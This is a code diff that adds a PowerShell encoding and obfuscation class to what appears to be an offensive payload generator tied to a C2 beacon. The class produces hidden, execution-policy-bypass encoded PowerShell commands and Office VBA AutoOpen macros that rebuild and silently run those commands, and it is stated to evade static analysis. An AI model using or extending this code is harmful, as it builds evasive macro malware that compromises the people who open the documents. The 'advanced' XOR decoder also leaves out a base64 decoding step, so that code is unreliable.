@@ -1022,3 +1022,125 @@ def get_payload_generator(c2_url: str = None) -> PayloadGenerator:
     if _generator is None or c2_url:
         _generator = PayloadGenerator(c2_url or "http://127.0.0.1:8080/c2/beacon")
     return _generator
+
+# ============================================================================
+# ENCODER UTILITIES - PowerShell One-Liner & Obfuscation
+# ============================================================================
+
+class PowerShellEncoder:
+    """Encode PowerShell payloads to evade static analysis"""
+    
+    @staticmethod
+    def encode_to_base64(code: str) -> str:
+        """Convert PowerShell code to Base64 UTF-16LE encoded format"""
+        # UTF-16LE encoding
+        encoded = code.encode('utf-16-le')
+        # Base64
+        b64 = base64.b64encode(encoded).decode('ascii')
+        return b64
+    
+    @staticmethod
+    def generate_oneliner(code: str, obfuscation_level: str = "basic") -> str:
+        """
+        Convert PowerShell code to one-liner format with EncodedCommand
+        
+        Args:
+            code: PowerShell code to encode
+            obfuscation_level: 'none', 'basic', 'advanced'
+        
+        Returns:
+            One-liner PowerShell command
+        """
+        if obfuscation_level == "advanced":
+            # Advanced: Split into chunks + XOR obfuscation
+            return PowerShellEncoder._advanced_obfuscate(code)
+        elif obfuscation_level == "basic":
+            # Basic: String splitting
+            return PowerShellEncoder._basic_obfuscate(code)
+        else:
+            # None: Direct encoding
+            return PowerShellEncoder._simple_encode(code)
+    
+    @staticmethod
+    def _simple_encode(code: str) -> str:
+        """Simple Base64 encoding"""
+        b64 = PowerShellEncoder.encode_to_base64(code)
+        return f'powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc {b64}'
+    
+    @staticmethod
+    def _basic_obfuscate(code: str) -> str:
+        """
+        Basic obfuscation: Split encoded payload into 3-4 chunks
+        VBA'da bu chunks'ları birleştir ve çalıştır
+        """
+        b64 = PowerShellEncoder.encode_to_base64(code)
+        
+        # Chunk size
+        chunk_size = len(b64) // 3
+        chunks = [
+            b64[0:chunk_size],
+            b64[chunk_size:chunk_size*2],
+            b64[chunk_size*2:]
+        ]
+        
+        # VBA uyumlu output (chunks)
+        vba_code = 'Sub AutoOpen()\n'
+        vba_code += '    Dim cmd As String\n'
+        vba_code += f"    Dim part1 As String: part1 = \"{chunks[0]}\"\n"
+        vba_code += f"    Dim part2 As String: part2 = \"{chunks[1]}\"\n"
+        vba_code += f"    Dim part3 As String: part3 = \"{chunks[2]}\"\n"
+        vba_code += '    cmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc " & part1 & part2 & part3\n'
+        vba_code += '    CreateObject("WScript.Shell").Run cmd, 0, False\n'
+        vba_code += 'End Sub\n'
+        
+        return vba_code
+    
+    @staticmethod
+    def _advanced_obfuscate(code: str) -> str:
+        """
+        Advanced obfuscation: XOR + Base64 + String reverse + multiple layers
+        """
+        import base64
+        
+        # Step 1: Base64 encode
+        b64 = PowerShellEncoder.encode_to_base64(code)
+        
+        # Step 2: Simple XOR cipher (byte-level)
+        xor_key = random.randint(0x01, 0xFF)
+        xor_bytes = bytearray([ord(c) ^ xor_key for c in b64])
+        xor_b64 = base64.b64encode(xor_bytes).decode('ascii')
+        
+        # Step 3: Reverse
+        reversed_xor = xor_b64[::-1]
+        
+        # VBA uyumlu multi-layer decoder
+        vba_code = 'Sub AutoOpen()\n'
+        vba_code += '    Dim encoded As String\n'
+        vba_code += f'    encoded = "{reversed_xor}"\n'
+        vba_code += '    \n'
+        vba_code += '    Dim decoded As String\n'
+        vba_code += '    decoded = StrReverse(encoded)\n'
+        vba_code += '    \n'
+        vba_code += f'    Dim xorKey As Integer: xorKey = {xor_key}\n'
+        vba_code += '    Dim i As Integer\n'
+        vba_code += '    Dim xorDecoded As String\n'
+        vba_code += '    xorDecoded = ""\n'
+        vba_code += '    For i = 1 To Len(decoded)\n'
+        vba_code += '        xorDecoded = xorDecoded & Chr(Asc(Mid(decoded, i, 1)) Xor xorKey)\n'
+        vba_code += '    Next i\n'
+        vba_code += '    \n'
+        vba_code += '    Dim cmd As String\n'
+        vba_code += '    cmd = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc " & xorDecoded\n'
+        vba_code += '    CreateObject("WScript.Shell").Run cmd, 0, False\n'
+        vba_code += 'End Sub\n'
+        
+        return vba_code
+    
+    @staticmethod
+    def minify_powershell(code: str) -> str:
+        """Remove comments and whitespace from PowerShell code"""
+        # Remove comment lines
+        lines = [line for line in code.split('\n') if not line.strip().startswith('#')]
+        # Join and minimize whitespace
+        minified = ' '.join(line.strip() for line in lines if line.strip())
+        return minified
